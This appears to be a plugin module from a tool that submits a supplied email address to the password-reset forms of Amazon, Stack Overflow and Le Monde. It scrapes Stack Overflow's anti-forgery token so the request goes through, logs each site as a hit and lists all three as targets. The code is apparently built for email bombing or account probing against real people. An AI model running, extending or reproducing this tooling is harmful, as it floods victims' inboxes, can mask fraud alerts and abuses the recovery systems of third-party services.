"""Cibles focus — Amazon · Stack Overflow · Le Monde."""
import re

from http_util import post_form, scrape_form_post


def amazon(session, email, stats):
    url = (
        "https://www.amazon.fr/ap/forgotpassword?"
        "openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F"
        "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
        "&openid.assoc_handle=frflex&openid.mode=checkid_setup&language=fr_FR"
    )
    return scrape_form_post(session, "Amazon", stats, url, email, ("ap_email",), url)


def stackoverflow(session, email, stats):
    page = "https://stackoverflow.com/users/account-recovery"
    try:
        r = session.get(page, timeout=16)
        fkey = re.search(r'name="fkey"\s+value="([^"]+)"', r.text)
        data = {"email": email}
        if fkey:
            data["fkey"] = fkey.group(1)
        return post_form(session, "Stack Overflow", stats, page, data, referer=page)
    except Exception as e:
        stats.hit("Stack Overflow", False, str(e)[:40])
        return None


def lemonde(session, email, stats):
    return post_form(
        session, "Le Monde", stats,
        "https://secure.lemonde.fr/sfuser/password/lost",
        {"email": email},
        referer="https://secure.lemonde.fr/sfuser/password/lost",
    )


TARGETS = [
    ("Amazon", amazon),
    ("Stack Overflow", stackoverflow),
    ("Le Monde", lemonde),
]
